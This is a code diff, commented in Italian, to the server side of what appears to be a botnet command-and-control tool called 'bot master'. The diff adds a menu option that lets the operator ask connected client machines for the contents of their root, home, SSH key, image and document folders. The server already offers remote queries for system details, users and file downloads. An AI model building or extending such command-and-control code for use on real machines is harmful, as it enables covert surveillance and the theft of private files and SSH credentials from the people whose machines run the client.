@@ -15,13 +15,15 @@ import re  # Necessario per la codifica della richiesta ricevuta dal client
 from . import bot_master_utility as bot_master_utils
 
 __response_options = {"1": "OS-TYPE", "2": "CPU-STATS", "3": "RAM", "4": "PARTITION-DISK-INFO", "5": "PARTITION-DISK-STATUS",
-                      "6": "IO-CONNECTED", "7": "NETWORK-INFO", "8": "USERS", "9": "DOWNLOAD-FILE", "q": "QUIT"}
+                      "6": "IO-CONNECTED", "7": "NETWORK-INFO", "8": "USERS", "9": "DOWNLOAD-FILE", "C": "Content-Path", "q": "QUIT"}
 
 # Definiamo degli header custom per identificare il tipo di dato ricevuto dal client
 # Per la gestione della ricezione dei file utilizziamo il seguente formato: <File-Name>NOME_FILE<File-Content>CONTENUTO_FILE
 __headers_type = {"1": b"<File-Name>", "2": b"<File-Content>", "3": b"<File-Not-Found>", "4": b"<OS-type>", "5": b"<CPU-stats>", "6": b"<Ram-usage>",
                   "7": b"<Partition-disk-info>", "8": b"<Partition-disk-status>", "9": b"<IO-connected>", "10": b"<Network-info>", "11": b"<Users>",
                   "12": b"<Content-Path>"}
+
+__filesystem_hierarchy_components = {"1": "Root", "2": "Home", "3": "SSH KEYS", "4": "Images", "5": "Documents"}
 
 __buffer_size = 8192
 
@@ -80,8 +82,11 @@ async def ask_operation(writer: asyncio.StreamWriter) -> None:
         if request in __response_options.keys():
             print(f"Opzione scelta: {request}")
             chosen_operation = __response_options.get(request)
-            writer.write(chosen_operation.encode())
-            await writer.drain()  # Attendiamo che venga eseguito il flush del writer prima di proseguire
+            if chosen_operation == "Content-Path":
+                await ask_content_path(writer)
+            else:
+                writer.write(chosen_operation.encode())
+                await writer.drain()  # Attendiamo che venga eseguito il flush del writer prima di proseguire
         else:
             chosen_operation = "OPERATION_NOT_SUPPORTED"  # Testing nel caso in cui niente di quello inserito dall'utente matchi
             writer.write(chosen_operation.encode())
@@ -89,6 +94,22 @@ async def ask_operation(writer: asyncio.StreamWriter) -> None:
         if not writer:
             print("SONO QUI")
     except Exception as e:
+        bot_master_utils.info(f"{type(e)}: {e}", 2)
+        loop = asyncio.get_event_loop()
+        loop.close()
+
+
+async def ask_content_path(writer: asyncio.StreamWriter) -> None:
+    """Gestione della richiesta del contenuto del FS della macchina su cui gira il client."""
+    bot_master_utils.print_menu(__filesystem_hierarchy_components, "Path disponibili:", 32)
+    try:
+        request = await ainput(">>>> ")
+        if request in __filesystem_hierarchy_components.keys():
+            print(f"Operazione selezionata: {request}")
+            chosen_operation = __response_options["C"] + __filesystem_hierarchy_components.get(request)  # TODO: Modificare i values delle response in accordo con gli headers_type
+            writer.write(chosen_operation.encode())
+    except Exception as e:
+        #  TODO: In caso di eccezione ritornare (?)
         bot_master_utils.info(f"{type(e)}: {e}", 2)
         loop = asyncio.get_event_loop()
         loop.close()
